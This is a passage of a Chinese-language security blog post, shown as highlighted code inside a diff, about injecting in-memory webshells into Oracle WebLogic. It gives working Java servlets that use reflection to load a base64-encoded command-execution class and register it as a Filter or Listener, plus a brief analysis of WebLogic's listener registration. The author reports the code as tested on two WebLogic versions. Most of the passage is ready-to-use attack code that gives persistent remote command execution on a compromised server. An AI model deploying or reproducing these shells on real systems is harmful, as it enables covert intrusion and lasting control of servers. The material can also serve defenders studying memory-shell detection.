+            <span class="c1">//获取ChangeAwareClassLoader，因为cachedClasses这个变量在ChangeAwareClassLoader中
+</span><span class="c1"></span>            <span class="n">Field</span> <span class="n">classLoader</span> <span class="o">=</span> <span class="n">webAppServletContext</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">&#34;classLoader&#34;</span><span class="o">);</span>
+            <span class="n">classLoader</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+            <span class="n">ClassLoader</span> <span class="n">classLoader1</span> <span class="o">=</span> <span class="o">(</span><span class="n">ClassLoader</span><span class="o">)</span> <span class="n">classLoader</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">webAppServletContext</span><span class="o">);</span>
+            <span class="c1">//获取cachedClasses
+</span><span class="c1"></span>            <span class="n">Field</span> <span class="n">cachedClasses</span> <span class="o">=</span> <span class="n">classLoader1</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">&#34;cachedClasses&#34;</span><span class="o">);</span>
+            <span class="n">cachedClasses</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+            <span class="n">Object</span> <span class="n">cachedClasses_map</span> <span class="o">=</span> <span class="n">cachedClasses</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">classLoader1</span><span class="o">);</span>
+            <span class="n">Method</span> <span class="n">get</span> <span class="o">=</span> <span class="n">cachedClasses_map</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getDeclaredMethod</span><span class="o">(</span><span class="s">&#34;get&#34;</span><span class="o">,</span> <span class="n">Object</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>
+            <span class="n">get</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+            <span class="c1">//如果cachedClasses中不存在cmdFilter类
+</span><span class="c1"></span>            <span class="k">if</span> <span class="o">(</span><span class="n">get</span><span class="o">.</span><span class="na">invoke</span><span class="o">(</span><span class="n">cachedClasses_map</span><span class="o">,</span> <span class="s">&#34;cmdFilter&#34;</span><span class="o">)</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
+                <span class="c1">//把cmdFilter的class 存入cachedClasses中
+</span><span class="c1"></span>                <span class="n">Method</span> <span class="n">put</span> <span class="o">=</span> <span class="n">cachedClasses_map</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getMethod</span><span class="o">(</span><span class="s">&#34;put&#34;</span><span class="o">,</span> <span class="n">Object</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="n">Object</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>
+                <span class="n">put</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+                <span class="n">put</span><span class="o">.</span><span class="na">invoke</span><span class="o">(</span><span class="n">cachedClasses_map</span><span class="o">,</span> <span class="s">&#34;cmdFilter&#34;</span><span class="o">,</span> <span class="n">filter_class</span><span class="o">);</span>
+                <span class="c1">//获取filterManager类
+</span><span class="c1"></span>                <span class="n">Field</span> <span class="n">filterManager</span> <span class="o">=</span> <span class="n">webAppServletContext</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">&#34;filterManager&#34;</span><span class="o">);</span>
+                <span class="n">filterManager</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+                <span class="n">Object</span> <span class="n">o</span> <span class="o">=</span> <span class="n">filterManager</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">webAppServletContext</span><span class="o">);</span>
+                <span class="c1">//注册Filter
+</span><span class="c1"></span>                <span class="n">Method</span> <span class="n">registerFilter</span> <span class="o">=</span> <span class="n">o</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getDeclaredMethod</span><span class="o">(</span><span class="s">&#34;registerFilter&#34;</span><span class="o">,</span> <span class="n">String</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="n">String</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="n">String</span><span class="o">[].</span><span class="na">class</span><span class="o">,</span> <span class="n">String</span><span class="o">[].</span><span class="na">class</span><span class="o">,</span> <span class="n">Map</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="n">String</span><span class="o">[].</span><span class="na">class</span><span class="o">);</span>
+                <span class="n">registerFilter</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+                <span class="n">registerFilter</span><span class="o">.</span><span class="na">invoke</span><span class="o">(</span><span class="n">o</span><span class="o">,</span> <span class="s">&#34;test&#34;</span><span class="o">,</span> <span class="s">&#34;cmdFilter&#34;</span><span class="o">,</span> <span class="k">new</span> <span class="n">String</span><span class="o">[]{</span><span class="s">&#34;/*&#34;</span><span class="o">},</span> <span class="kc">null</span><span class="o">,</span> <span class="kc">null</span><span class="o">,</span> <span class="kc">null</span><span class="o">);</span>
+                <span class="n">response</span><span class="o">.</span><span class="na">getWriter</span><span class="o">().</span><span class="na">write</span><span class="o">(</span><span class="s">&#34;success!!!&#34;</span><span class="o">);</span>
+            <span class="o">}</span>
+
+        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
+
+        <span class="o">}</span>
+
+    <span class="o">}</span>
+
+    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">destroy</span><span class="o">()</span> <span class="o">{</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+</code></pre></td></tr></table></div>
+</div>
+</div><p><img src="/images/image-20211106220909.png" alt=""></p>
+<h2 id="listener"><a href="#listener" class="anchor-link">#</a><a href="#contents:listener" class="headings">Listener</a></h2>
+<h3 id="listener-注册过程分析"><a href="#listener-注册过程分析" class="anchor-link">#</a><a href="#contents:listener-注册过程分析" class="headings">Listener 注册过程分析</a></h3>
+<p>和Filter注册过程差不多，webAppServletContext中的registerListener方法可以注册Listener，但当context启动后不能直接通过该方法注册，下面来分析一下。
+<img src="/images/image-20211106220946.png" alt="">
+跟进<code>this.addListener()</code> ，看到根据类名创建EventListener对象，传入到<code>this.addListener(Listener)</code>。
+<img src="/images/image-20211106221005.png" alt="">
+然后再继续跟进<code>this.addListener() </code>，可以看到对当前线程是否启动进行检查。通过的话便可调用<code>this.eventsManager.addEventListener(t);</code> 添加Listener。
+<img src="/images/image-20211106221024.png" alt="">
+如果当前<code>webAppServletContext.ContextPhase.START ==this.phase</code> 那么就抛出异常
+<img src="/images/image-20211106221043.png" alt="">
+所以可以模拟添加Listener的方法。先通过反射创建EventListener，再调用eventsManager的addEventListener方法即可。</p>
+<h3 id="实现代码-1"><a href="#实现代码-1" class="anchor-link">#</a><a href="#contents:实现代码-1" class="headings">实现代码</a></h3>
+<p>测试Weblogic 1036和12.1.3成功</p>
+<div class="highlight"><div class="chroma">
+<div class="table-container"><table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">  1
+</span><span class="lnt">  2
+</span><span class="lnt">  3
+</span><span class="lnt">  4
+</span><span class="lnt">  5
+</span><span class="lnt">  6
+</span><span class="lnt">  7
+</span><span class="lnt">  8
+</span><span class="lnt">  9
+</span><span class="lnt"> 10
+</span><span class="lnt"> 11
+</span><span class="lnt"> 12
+</span><span class="lnt"> 13
+</span><span class="lnt"> 14
+</span><span class="lnt"> 15
+</span><span class="lnt"> 16
+</span><span class="lnt"> 17
+</span><span class="lnt"> 18
+</span><span class="lnt"> 19
+</span><span class="lnt"> 20
+</span><span class="lnt"> 21
+</span><span class="lnt"> 22
+</span><span class="lnt"> 23
+</span><span class="lnt"> 24
+</span><span class="lnt"> 25
+</span><span class="lnt"> 26
+</span><span class="lnt"> 27
+</span><span class="lnt"> 28
+</span><span class="lnt"> 29
+</span><span class="lnt"> 30
+</span><span class="lnt"> 31
+</span><span class="lnt"> 32
+</span><span class="lnt"> 33
+</span><span class="lnt"> 34
+</span><span class="lnt"> 35
+</span><span class="lnt"> 36
+</span><span class="lnt"> 37
+</span><span class="lnt"> 38
+</span><span class="lnt"> 39
+</span><span class="lnt"> 40
+</span><span class="lnt"> 41
+</span><span class="lnt"> 42
+</span><span class="lnt"> 43
+</span><span class="lnt"> 44
+</span><span class="lnt"> 45
+</span><span class="lnt"> 46
+</span><span class="lnt"> 47
+</span><span class="lnt"> 48
+</span><span class="lnt"> 49
+</span><span class="lnt"> 50
+</span><span class="lnt"> 51
+</span><span class="lnt"> 52
+</span><span class="lnt"> 53
+</span><span class="lnt"> 54
+</span><span class="lnt"> 55
+</span><span class="lnt"> 56
+</span><span class="lnt"> 57
+</span><span class="lnt"> 58
+</span><span class="lnt"> 59
+</span><span class="lnt"> 60
+</span><span class="lnt"> 61
+</span><span class="lnt"> 62
+</span><span class="lnt"> 63
+</span><span class="lnt"> 64
+</span><span class="lnt"> 65
+</span><span class="lnt"> 66
+</span><span class="lnt"> 67
+</span><span class="lnt"> 68
+</span><span class="lnt"> 69
+</span><span class="lnt"> 70
+</span><span class="lnt"> 71
+</span><span class="lnt"> 72
+</span><span class="lnt"> 73
+</span><span class="lnt"> 74
+</span><span class="lnt"> 75
+</span><span class="lnt"> 76
+</span><span class="lnt"> 77
+</span><span class="lnt"> 78
+</span><span class="lnt"> 79
+</span><span class="lnt"> 80
+</span><span class="lnt"> 81
+</span><span class="lnt"> 82
+</span><span class="lnt"> 83
+</span><span class="lnt"> 84
+</span><span class="lnt"> 85
+</span><span class="lnt"> 86
+</span><span class="lnt"> 87
+</span><span class="lnt"> 88
+</span><span class="lnt"> 89
+</span><span class="lnt"> 90
+</span><span class="lnt"> 91
+</span><span class="lnt"> 92
+</span><span class="lnt"> 93
+</span><span class="lnt"> 94
+</span><span class="lnt"> 95
+</span><span class="lnt"> 96
+</span><span class="lnt"> 97
+</span><span class="lnt"> 98
+</span><span class="lnt"> 99
+</span><span class="lnt">100
+</span><span class="lnt">101
+</span><span class="lnt">102
+</span><span class="lnt">103
+</span><span class="lnt">104
+</span><span class="lnt">105
+</span><span class="lnt">106
+</span><span class="lnt">107
+</span><span class="lnt">108
+</span><span class="lnt">109
+</span><span class="lnt">110
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="kn">package</span> <span class="nn">com.example.web</span><span class="o">;</span>
+
+<span class="kn">import</span> <span class="nn">sun.misc.BASE64Decoder</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">weblogic.servlet.internal.EventsManager</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">weblogic.servlet.internal.ServletRequestImpl</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">weblogic.servlet.internal.WebAppServletContext</span><span class="o">;</span>
+
+<span class="kn">import</span> <span class="nn">javax.servlet.http.HttpServlet</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">javax.servlet.http.HttpServletRequest</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">javax.servlet.http.HttpServletResponse</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.io.IOException</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.lang.reflect.Field</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.lang.reflect.Method</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.util.EventListener</span><span class="o">;</span>
+
+<span class="kd">public</span> <span class="kd">class</span> <span class="nc">guguServlet</span> <span class="kd">extends</span> <span class="n">HttpServlet</span> <span class="o">{</span>
+    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">init</span><span class="o">()</span> <span class="o">{</span>
+    <span class="o">}</span>
+
+    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">doGet</span><span class="o">(</span><span class="n">HttpServletRequest</span> <span class="n">request</span><span class="o">,</span> <span class="n">HttpServletResponse</span> <span class="n">response</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">IOException</span> <span class="o">{</span>
+        <span class="n">Thread</span> <span class="n">thread</span> <span class="o">=</span> <span class="n">Thread</span><span class="o">.</span><span class="na">currentThread</span><span class="o">();</span>
+        <span class="k">try</span> <span class="o">{</span>
+            <span class="c1">//获取WebAppServletContext
+</span><span class="c1"></span>            <span class="n">Field</span> <span class="n">workEntry</span> <span class="o">=</span> <span class="n">Class</span><span class="o">.</span><span class="na">forName</span><span class="o">(</span><span class="s">&#34;weblogic.work.ExecuteThread&#34;</span><span class="o">).</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">&#34;workEntry&#34;</span><span class="o">);</span>
+            <span class="n">workEntry</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+            <span class="n">Object</span> <span class="n">workentry</span> <span class="o">=</span> <span class="n">workEntry</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">thread</span><span class="o">);</span>
+            <span class="n">WebAppServletContext</span> <span class="n">webAppServletContext</span><span class="o">=</span><span class="kc">null</span><span class="o">;</span>
+            <span class="k">try</span><span class="o">{</span> <span class="c1">//weblogic 12.1.3
+</span><span class="c1"></span>                <span class="n">Field</span> <span class="n">connectionHandler</span> <span class="o">=</span> <span class="n">workentry</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">&#34;connectionHandler&#34;</span><span class="o">);</span>
+                <span class="n">connectionHandler</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+                <span class="n">Object</span> <span class="n">http</span> <span class="o">=</span> <span class="n">connectionHandler</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">workentry</span><span class="o">);</span>
+
+                <span class="n">Field</span> <span class="n">request1</span> <span class="o">=</span> <span class="n">http</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">&#34;request&#34;</span><span class="o">);</span>
+                <span class="n">request1</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+                <span class="n">ServletRequestImpl</span> <span class="n">servletRequest</span> <span class="o">=</span> <span class="o">(</span><span class="n">ServletRequestImpl</span><span class="o">)</span> <span class="n">request1</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">http</span><span class="o">);</span>
+
+                <span class="n">Field</span> <span class="n">context</span> <span class="o">=</span> <span class="n">servletRequest</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">&#34;context&#34;</span><span class="o">);</span>
+                <span class="n">context</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+                <span class="n">webAppServletContext</span> <span class="o">=</span> <span class="o">(</span><span class="n">WebAppServletContext</span><span class="o">)</span> <span class="n">context</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">servletRequest</span><span class="o">);</span>
+
+            <span class="o">}</span><span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">){</span>
+                <span class="c1">//weblogic 1036
+</span><span class="c1"></span>                <span class="n">Field</span> <span class="n">context</span> <span class="o">=</span> <span class="n">workentry</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">&#34;context&#34;</span><span class="o">);</span>
+                <span class="n">context</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+                <span class="n">webAppServletContext</span> <span class="o">=</span> <span class="o">(</span><span class="n">WebAppServletContext</span><span class="o">)</span> <span class="n">context</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">workentry</span><span class="o">);</span>
+            <span class="o">}</span>
+            <span class="k">if</span><span class="o">(</span><span class="n">webAppServletContext</span><span class="o">==</span><span class="kc">null</span><span class="o">){</span><span class="k">throw</span> <span class="k">new</span> <span class="n">Exception</span><span class="o">(</span><span class="s">&#34;null&#34;</span><span class="o">);}</span>
+            <span class="c1">//加载字节码
+</span><span class="c1"></span>            <span class="n">String</span> <span class="n">encode_class</span> <span class="o">=</span><span class="s">&#34;yv66vgAAADQAdwoAGAA8CgA9AD4IADELAD8AQAoAQQBCCgBBAEMHAEQHAEUKAEYARwoACABICgAHAEkHAEoKAAwAPAoABwBLCgAMAEwIAE0KAAwATgcATwoAEgBQCgBRAFIKAFMAVAcAVQcAVgcAVwcAWAEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAcTGNvbS9leGFtcGxlL3dlYi9teUxpc3RlbmVyOwEAEHJlcXVlc3REZXN0cm95ZWQBACYoTGphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3RFdmVudDspVgEAE3NlcnZsZXRSZXF1ZXN0RXZlbnQBACNMamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdEV2ZW50OwEAEnJlcXVlc3RJbml0aWFsaXplZAEAAnBzAQATTGphdmEvbGFuZy9Qcm9jZXNzOwEAAmJyAQAYTGphdmEvaW8vQnVmZmVyZWRSZWFkZXI7AQACc2IBABhMamF2YS9sYW5nL1N0cmluZ0J1ZmZlcjsBAARsaW5lAQASTGphdmEvbGFuZy9TdHJpbmc7AQAGcmVzdWx0AQAIcmVzcG9uc2UBAC9Md2VibG9naWMvc2VydmxldC9pbnRlcm5hbC9TZXJ2bGV0UmVzcG9uc2VJbXBsOwEAA2NtZAEADVN0YWNrTWFwVGFibGUHAFYHAFkHAFoHAFsHAEQHAEoHAFUBAApTb3VyY2VGaWxlAQAPbXlMaXN0ZW5lci5qYXZhDAAaABsHAFkMAFwAXQcAXgwAXwBgBwBhDABiAGMMAGQAZQEAFmphdmEvaW8vQnVmZmVyZWRSZWFkZXIBABlqYXZhL2lvL0lucHV0U3RyZWFtUmVhZGVyBwBbDABmAGcMABoAaAwAGgBpAQAWamF2YS9sYW5nL1N0cmluZ0J1ZmZlcgwAagBrDABsAG0BAAQ8YnI+DABuAGsBACx3ZWJsb2dpYy9zZXJ2bGV0L2ludGVybmFsL1NlcnZsZXRSZXF1ZXN0SW1wbAwAbwBwBwBxDAByAHMHAHQMAHUAdgEAE2phdmEvaW8vSU9FeGNlcHRpb24BABpjb20vZXhhbXBsZS93ZWIvbXlMaXN0ZW5lcgEAEGphdmEvbGFuZy9PYmplY3QBACRqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0TGlzdGVuZXIBACFqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0RXZlbnQBABBqYXZhL2xhbmcvU3RyaW5nAQARamF2YS9sYW5nL1Byb2Nlc3MBABFnZXRTZXJ2bGV0UmVxdWVzdAEAICgpTGphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3Q7AQAcamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdAEADGdldFBhcmFtZXRlcgEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmc7AQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEADmdldElucHV0U3RyZWFtAQAXKClMamF2YS9pby9JbnB1dFN0cmVhbTsBABgoTGphdmEvaW8vSW5wdXRTdHJlYW07KVYBABMoTGphdmEvaW8vUmVhZGVyOylWAQAIcmVhZExpbmUBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwEABmFwcGVuZAEALChMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmdCdWZmZXI7AQAIdG9TdHJpbmcBAAtnZXRSZXNwb25zZQEAMSgpTHdlYmxvZ2ljL3NlcnZsZXQvaW50ZXJuYWwvU2VydmxldFJlc3BvbnNlSW1wbDsBAC13ZWJsb2dpYy9zZXJ2bGV0L2ludGVybmFsL1NlcnZsZXRSZXNwb25zZUltcGwBAAlnZXRXcml0ZXIBABcoKUxqYXZhL2lvL1ByaW50V3JpdGVyOwEAE2phdmEvaW8vUHJpbnRXcml0ZXIBAAV3cml0ZQEAFShMamF2YS9sYW5nL1N0cmluZzspVgAhABcAGAABABkAAAADAAEAGgAbAAEAHAAAAC8AAQABAAAABSq3AAGxAAAAAgAdAAAABgABAAAADAAeAAAADAABAAAABQAfACAAAAABACEAIgABABwAAAA1AAAAAgAAAAGxAAAAAgAdAAAABgABAAAAEAAeAAAAFgACAAAAAQAfACAAAAAAAAEAIwAkAAEAAQAlACIAAQAcAAABXwAFAAkAAAByK7YAAhIDuQAEAgBNLMYAZLgABSy2AAZOuwAHWbsACFkttgAJtwAKtwALOgS7AAxZtwANOgUZBLYADlk6BsYAExkFGQa2AA8SELYAD1en/+gZBbYAEToHK7YAAsAAErYAEzoIGQi2ABQZB7YAFacABE6xAAEAEABtAHAAFgADAB0AAAA2AA0AAAAUAAwAFQAQABcAGAAYACwAGQA1ABsAQAAcAFAAHgBXAB8AYwAgAG0AIgBwACEAcQAkAB4AAABcAAkAGABVACYAJwADACwAQQAoACkABAA1ADgAKgArAAUAPQAwACwALQAGAFcAFgAuAC0ABwBjAAoALwAwAAgAAAByAB8AIAAAAAAAcgAjACQAAQAMAGYAMQAtAAIAMgAAADUABP8ANQAGBwAzBwA0BwA1BwA2BwA3BwA4AAD8ABoHADX/AB8AAwcAMwcANAcANQABBwA5AAABADoAAAACADs=&#34;</span><span class="o">;</span>
+            <span class="kt">byte</span><span class="o">[]</span> <span class="n">decode_class</span> <span class="o">=</span> <span class="k">new</span> <span class="n">BASE64Decoder</span><span class="o">().</span><span class="na">decodeBuffer</span><span class="o">(</span><span class="n">encode_class</span><span class="o">);</span>
+            <span class="n">Method</span> <span class="n">defineClass</span> <span class="o">=</span> <span class="n">ClassLoader</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">getDeclaredMethod</span><span class="o">(</span><span class="s">&#34;defineClass&#34;</span><span class="o">,</span> <span class="kt">byte</span><span class="o">[].</span><span class="na">class</span><span class="o">,</span> <span class="n">Integer</span><span class="o">.</span><span class="na">TYPE</span><span class="o">,</span> <span class="n">Integer</span><span class="o">.</span><span class="na">TYPE</span><span class="o">);</span>
+            <span class="n">defineClass</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+            <span class="c1">//这里为了适配weblogic 1036 必须反射获取webAppServletContext中的classLoader
+</span><span class="c1"></span>            <span class="n">Field</span> <span class="n">loader</span> <span class="o">=</span> <span class="n">webAppServletContext</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">&#34;classLoader&#34;</span><span class="o">);</span>
+            <span class="n">loader</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+            <span class="n">ClassLoader</span> <span class="n">ClassLoader0</span><span class="o">=</span> <span class="o">(</span><span class="n">ClassLoader</span><span class="o">)</span> <span class="n">loader</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">webAppServletContext</span><span class="o">);</span>
+            <span class="n">Class</span> <span class="n">filter_class</span> <span class="o">=</span> <span class="o">(</span><span class="n">Class</span><span class="o">)</span> <span class="n">defineClass</span><span class="o">.</span><span class="na">invoke</span><span class="o">(</span><span class="n">ClassLoader0</span><span class="o">,</span> <span class="n">decode_class</span><span class="o">,</span> <span class="n">0</span><span class="o">,</span> <span class="n">decode_class</span><span class="o">.</span><span class="na">length</span><span class="o">);</span>
+
+            <span class="c1">//获取ChangeAwareClassLoader，因为cachedClasses这个变量在ChangeAwareClassLoader中
+</span><span class="c1"></span>            <span class="n">Field</span> <span class="n">classLoader</span> <span class="o">=</span> <span class="n">webAppServletContext</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">&#34;classLoader&#34;</span><span class="o">);</span>
+            <span class="n">classLoader</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+            <span class="n">ClassLoader</span> <span class="n">classLoader1</span> <span class="o">=</span> <span class="o">(</span><span class="n">ClassLoader</span><span class="o">)</span> <span class="n">classLoader</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">webAppServletContext</span><span class="o">);</span>
+            <span class="c1">//获取cachedClasses
+</span><span class="c1"></span>            <span class="n">Field</span> <span class="n">cachedClasses</span> <span class="o">=</span> <span class="n">classLoader1</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">&#34;cachedClasses&#34;</span><span class="o">);</span>
+            <span class="n">cachedClasses</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+            <span class="n">Object</span> <span class="n">cachedClasses_map</span> <span class="o">=</span> <span class="n">cachedClasses</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">classLoader1</span><span class="o">);</span>
+            <span class="n">Method</span> <span class="n">get</span> <span class="o">=</span> <span class="n">cachedClasses_map</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getDeclaredMethod</span><span class="o">(</span><span class="s">&#34;get&#34;</span><span class="o">,</span> <span class="n">Object</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>
+            <span class="n">get</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+            <span class="c1">//如果cachedClasses中不存在cmdListener类
+</span><span class="c1"></span>            <span class="k">if</span> <span class="o">(</span><span class="n">get</span><span class="o">.</span><span class="na">invoke</span><span class="o">(</span><span class="n">cachedClasses_map</span><span class="o">,</span> <span class="s">&#34;cmdListener&#34;</span><span class="o">)</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
+                <span class="c1">//把cmdListener的class 存入cachedClasses中
+</span><span class="c1"></span>                <span class="n">Method</span> <span class="n">put</span> <span class="o">=</span> <span class="n">cachedClasses_map</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getMethod</span><span class="o">(</span><span class="s">&#34;put&#34;</span><span class="o">,</span> <span class="n">Object</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="n">Object</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>
+                <span class="n">put</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+                <span class="n">put</span><span class="o">.</span><span class="na">invoke</span><span class="o">(</span><span class="n">cachedClasses_map</span><span class="o">,</span> <span class="s">&#34;cmdListener&#34;</span><span class="o">,</span> <span class="n">filter_class</span><span class="o">);</span>
+
+                <span class="n">Field</span> <span class="n">eM</span> <span class="o">=</span> <span class="n">webAppServletContext</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">&#34;eventsManager&#34;</span><span class="o">);</span>
+                <span class="n">eM</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+                <span class="n">EventsManager</span> <span class="n">eventsManager</span><span class="o">=(</span><span class="n">EventsManager</span><span class="o">)</span><span class="n">eM</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">webAppServletContext</span><span class="o">);</span>
+                <span class="k">try</span> <span class="o">{</span>
+                    <span class="c1">//Weblogic 12.1.3
+</span><span class="c1"></span>                    <span class="c1">//创建EventListener
+</span><span class="c1"></span>                    <span class="n">Method</span> <span class="n">listen</span><span class="o">=</span><span class="n">eventsManager</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getDeclaredMethod</span><span class="o">(</span><span class="s">&#34;createListener&#34;</span><span class="o">,</span> <span class="n">String</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>
+                    <span class="n">listen</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+                    <span class="n">EventListener</span> <span class="n">listener</span><span class="o">=(</span><span class="n">EventListener</span><span class="o">)</span><span class="n">listen</span><span class="o">.</span><span class="na">invoke</span><span class="o">(</span><span class="n">eventsManager</span><span class="o">,</span><span class="s">&#34;cmdListener&#34;</span><span class="o">);</span>
+
+                    <span class="c1">//调用addEventListener添加Listener
+</span><span class="c1"></span>                    <span class="n">Method</span> <span class="n">addListener</span> <span class="o">=</span> <span class="n">eventsManager</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getDeclaredMethod</span><span class="o">(</span><span class="s">&#34;addEventListener&#34;</span><span class="o">,</span> <span class="n">EventListener</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>
+                    <span class="n">addListener</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+                    <span class="n">addListener</span><span class="o">.</span><span class="na">invoke</span><span class="o">(</span><span class="n">eventsManager</span><span class="o">,</span><span class="n">listener</span><span class="o">);</span>
+                    <span class="n">response</span><span class="o">.</span><span class="na">getWriter</span><span class="o">().</span><span class="na">write</span><span class="o">(</span><span class="s">&#34;success!!!&#34;</span><span class="o">);</span>
